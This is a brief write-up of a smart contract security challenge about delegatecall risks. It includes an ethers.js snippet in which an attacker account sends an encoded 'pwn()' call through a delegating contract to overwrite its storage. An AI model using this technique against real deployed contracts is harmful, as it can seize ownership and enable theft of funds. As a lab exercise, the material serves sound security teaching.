This challenge demonstrates the usage of delegatecall and its risks, modifying the storage of the former contract.

Here is an example on how to send a transaction to the delegated contract:

const iface = new ethers.utils.Interface(["function pwn()"]);
const data = iface.encodeFunctionData("pwn");

const tx = await attacker.sendTransaction({
  to: delegate.address,
  data,
  gasLimit: 100000,
});
await tx.wait();

gasLimit has been explicitly set because gas estimations might fail when making delegate calls.
